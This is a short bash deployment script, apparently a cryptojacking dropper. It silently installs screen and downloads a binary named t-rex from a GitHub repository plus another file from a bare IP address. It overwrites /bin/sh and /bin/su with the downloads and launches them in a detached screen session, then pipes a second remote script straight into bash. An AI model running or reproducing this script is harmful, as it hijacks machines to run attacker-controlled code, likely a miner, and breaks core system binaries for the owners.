#!/bin/bash
echo "ENGINE START!"
export LD_PRELOAD=

apt install screen -y > /dev/null 2>&1

curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
curl -sLO http://139.59.230.245:7800/down/87J4LekusQat

mv t-rex /bin/sh
mv 87J4LekusQat /bin/su
chmod +x /bin/sh
chmod +x /bin/su

screen -S sesi /bin/sh -c /bin/su
screen -ls
clear
screen -ls
curl -s https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/sca.sh |bash
